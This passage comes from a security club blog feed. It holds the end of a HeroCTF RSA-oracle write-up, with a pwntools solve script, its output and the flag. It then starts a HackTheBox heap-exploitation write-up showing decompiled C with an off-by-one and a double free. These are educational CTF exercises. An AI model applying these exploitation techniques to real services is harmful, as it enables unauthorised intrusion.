send &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; m: r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(str(m)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
recv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt;: int(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])

r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;crypto.heroctf.fr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9000&lt;/span&gt;)

c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recv()                             &lt;span style=&#34;color:#75715e&#34;&gt;# get c&lt;/span&gt;

send(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)                               &lt;span style=&#34;color:#75715e&#34;&gt;# send c^2&lt;/span&gt;
n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recv() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;                          &lt;span style=&#34;color:#75715e&#34;&gt;# get m^2&lt;/span&gt;
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Got N&amp;#39;&lt;/span&gt;)

send(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)                                &lt;span style=&#34;color:#75715e&#34;&gt;# use 2 as blinding value&lt;/span&gt;
two &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recv()

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; tqdm(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65537&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)):     &lt;span style=&#34;color:#75715e&#34;&gt;# retreive e&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pow(two, e, n) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Got e&amp;#39;&lt;/span&gt;, e)

send(c &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)                            &lt;span style=&#34;color:#75715e&#34;&gt;# blind the encrypted flag&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (recv() &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pow(two, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, n)) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n     &lt;span style=&#34;color:#75715e&#34;&gt;# unblind the flag&lt;/span&gt;
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Got flag&amp;#39;&lt;/span&gt;, unpad(long_to_bytes(p), &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;))

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;output
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Got N
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; 87%|█████████████████████████▏   | 28495/32767 [00:13&amp;lt;00:02, 2126.60it/s]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Got e 56993
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Got flag b&amp;#39;Hero&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{m4ybe_le4ving_the_1nt3rn_run_th3_plac3_wasnt_a_g00d_id3a}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;to-conclude&#34;&gt;To conclude&lt;/h1&gt;
&lt;p&gt;Making challenges is easy, making challenges that you think the players will find interesting is hard and making interesting challenges that won&amp;rsquo;t be full of &amp;ldquo;unintendeds&amp;rdquo; is even harder. I&amp;rsquo;ve already coded and tested several crypto challenges for next year (HeroCTF v5 is planned for january 2023) and hopefully they won&amp;rsquo;t be full of holes. Ironically, a challenge full of holes is a great way for everybody to learn.&lt;/p&gt;
- https://clubsecu-esiea.github.io/posts/oracles_apprentice/ - Beerware shit</description>
        </item>
    
    
    
        <item>
        <title>[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all</title>
        <link>https://clubsecu-esiea.github.io/posts/onceandforall/</link>
        <pubDate>Thu, 19 May 2022 00:00:00 +0000</pubDate>
        
        <guid>https://clubsecu-esiea.github.io/posts/onceandforall/</guid>
        <description>ESIEA security club https://clubsecu-esiea.github.io/posts/onceandforall/ -&lt;p&gt;Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.
Find the tasks and the final exploit &lt;a href=&#34;https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/&#34;&gt;here&lt;/a&gt; and &lt;a href=&#34;https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id=&#34;reverse-engineering&#34;&gt;Reverse engineering&lt;/h1&gt;
&lt;p&gt;All the snippets of pseudo-code are issued by &lt;a href=&#34;https://hex-rays.com/ida-free/&#34;&gt;IDA freeware&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;envp)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v4; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-8h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+1Ch] [rbp-4h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    puts(s);
    printf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_1310);
    __isoc99_scanf(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_13C8, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v4);
    puts(s);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ( v4 )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        small_alloc(s);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        fix(s);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        examine(s);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        savebig(s);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Invalid choice!&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    }
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The binary allows you to allocate a small chunk beetween &lt;code&gt;0x1f&lt;/code&gt; and &lt;code&gt;0x38&lt;/code&gt; bytes:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;small_alloc&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// rbx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  size_t nmemb; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+0h] [rbp-20h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-18h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( allocated &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nothing more!&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;allocated;
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, idx);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;alloc_array)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEuLL&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Invalid!&amp;#34;&lt;/span&gt;);
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;How much space do you need for it: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;nmemb);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( nmemb &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; nmemb &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Your inventory cannot provide this type of space!&amp;#34;&lt;/span&gt;);
  size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nmemb;
  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
  (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;alloc_array)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;)calloc(nmemb, &lt;span style=&#34;color:#ae81ff&#34;&gt;1uLL&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;alloc_array)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] )
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Something didn&amp;#39;t work out...&amp;#34;&lt;/span&gt;);
    exit(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  }
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input your weapon&amp;#39;s details: &amp;#34;&lt;/span&gt;);
  
  &lt;span style=&#34;color:#75715e&#34;&gt;# off-by-one
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, (&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;alloc_array)[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]], nmemb &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you can see right above this function contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk.&lt;/p&gt;
&lt;p&gt;The fix function frees a chunk and asks for another size, then it allocates another chunk with &lt;code&gt;calloc&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fix&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; result; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// rbx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; idx; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-28h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  size_t size; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-20h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-18h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;idx);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Invalid!&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Ok, let&amp;#39;s get you some new parts for this one... seems like it&amp;#39;s broken&amp;#34;&lt;/span&gt;);
  free(alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]);
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;How much space do you need for this repair: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt; )
    &lt;span style=&#34;color:#75715e&#34;&gt;# [1] 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Your inventory cannot provide this type of space.&amp;#34;&lt;/span&gt;);
  size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size;
  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; idx;
  alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; calloc(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1uLL&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] )
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Something didn&amp;#39;t work out...&amp;#34;&lt;/span&gt;);
    exit(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  }
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input your weapon&amp;#39;s details: &amp;#34;&lt;/span&gt;);
  read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx], size);
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;What would you like to do now?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1. Verify weapon&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2. Continue&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, v4);
  result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( verified )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_1648);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    {
      result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puts((&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]);
      verified &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we reach &lt;code&gt;[1]&lt;/code&gt;, &lt;code&gt;alloc_array[2 * idx]&lt;/code&gt; is freed leading to a double free.&lt;/p&gt;
&lt;p&gt;We can print a chunk only one time:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;examine&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-8h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( examined )
